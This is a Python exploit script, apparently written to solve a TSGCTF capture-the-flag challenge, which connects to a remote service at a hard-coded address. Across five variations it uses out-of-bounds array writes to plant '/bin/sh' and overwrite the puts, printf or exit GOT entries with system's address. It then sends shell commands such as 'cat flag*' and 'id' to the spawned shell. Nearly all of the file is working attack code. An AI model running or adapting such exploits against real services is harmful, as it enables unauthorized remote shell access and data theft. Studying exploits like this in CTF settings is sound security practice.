#!/usr/bin/env python3
"""
Interactive nc testing - try multiple exploit variations
"""
import socket
import time

def test_exploit(name, writes, trigger_cmd="-1"):
    """Test an exploit variation"""
    print(f"\n{'='*60}")
    print(f"Testing: {name}")
    print('='*60)
    
    try:
        s = socket.socket()
        s.settimeout(15)
        s.connect(('34.84.25.24', 58554))
        
        def send_pair(idx, val):
            try:
                data = s.recv(4096)
                s.sendall(f"{idx}\n".encode())
                time.sleep(0.1)
                data = s.recv(4096)
                s.sendall(f"{val}\n".encode())
                time.sleep(0.1)
            except Exception as e:
                print(f"  [!] Send error: {e}")
        
        # Send writes
        for idx, val in writes:
            send_pair(idx, val)
        
        # Trigger
        s.recv(4096)
        s.sendall(f"{trigger_cmd}\n".encode())
        time.sleep(0.5)
        
        # Try to send commands
        for cmd in [b"cat flag*\n", b"ls\n", b"id\n"]:
            try:
                s.sendall(cmd)
                time.sleep(0.3)
            except:
                pass
        
        # Read output
        output = b''
        s.settimeout(3)
        try:
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                output += chunk
        except:
            pass
        
        print(output.decode(errors='ignore'))
        
        if b'TSGCTF{' in output:
            print(f"\n[+] FLAG FOUND!")
            start = output.find(b'TSGCTF{')
            end = output.find(b'}', start) + 1
            print(f"[+] {output[start:end].decode()}")
            return True
        
        s.close()
        return False
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

# Test 1: Original payload
print("\n[*] Starting exploit variations test...")

test_exploit(
    "Original GOT hijack (puts->system)",
    [
        (0, 1852400175),   # "/bin"
        (1, 6845231),      # "/sh\x00"
        (-22, 6295744),    # msg low
        (-21, 0),          # msg high
        (-40, 4196032),    # puts@GOT low
        (-39, 0),          # puts@GOT high
    ]
)

# Test 2: Try without shell, just read values
test_exploit(
    "Just write /bin/sh and msg, no GOT overwrite",
    [
        (0, 1852400175),   # "/bin"
        (1, 6845231),      # "/sh\x00"
        (-22, 6295744),    # msg low
        (-21, 0),          # msg high
    ]
)

# Test 3: Try overwriting printf instead
test_exploit(
    "Printf GOT hijack",
    [
        (0, 1852400175),   # "/bin"
        (1, 6845231),      # "/sh\x00"
        (-22, 6295744),    # msg low
        (-21, 0),          # msg high
        (-32, 4196032),    # printf@GOT (0x601040) low
        (-31, 0),          # printf@GOT high
    ]
)

# Test 4: Overwrite exit@GOT and trigger via scanf error
print("\n" + "="*60)
print("Test 4: Exit GOT + trigger via scanf error")
print("="*60)
try:
    s = socket.socket()
    s.settimeout(15)
    s.connect(('34.84.25.24', 58554))
    
    # Write command and setup
    writes = [
        (0, 1852400175),   # "/bin"
        (1, 6845231),      # "/sh\x00"
        (-22, 6295744),    # msg low
        (-21, 0),          # msg high
        (-28, 4196032),    # exit@GOT (0x601050) low
        (-27, 0),          # exit@GOT high
    ]
    
    for idx, val in writes:
        s.recv(4096)
        s.sendall(f"{idx}\n".encode())
        time.sleep(0.1)
        s.recv(4096)
        s.sendall(f"{val}\n".encode())
        time.sleep(0.1)
    
    # Trigger scanf error with non-integer
    s.recv(4096)
    s.sendall(b"AAAA\n")
    time.sleep(1)
    
    output = s.recv(8192)
    print(output.decode(errors='ignore'))
    s.close()
except Exception as e:
    print(f"Error: {e}")

# Test 5: Try corrupting loop counter to skip exit
test_exploit(
    "Corrupt loop counter 'i' to cause infinite/unusual behavior",
    [
        (0, 1852400175),
        (1, 6845231),
        (-22, 6295744),
        (-21, 0),
        # i is at 0x601104, offset = (0x601104 - 0x6010c0)//4 = 17
        (17, -1),  # Set i to -1
        (-40, 4196032),
        (-39, 0),
    ]
)

print("\n" + "="*60)
print("All tests completed")
print("="*60)
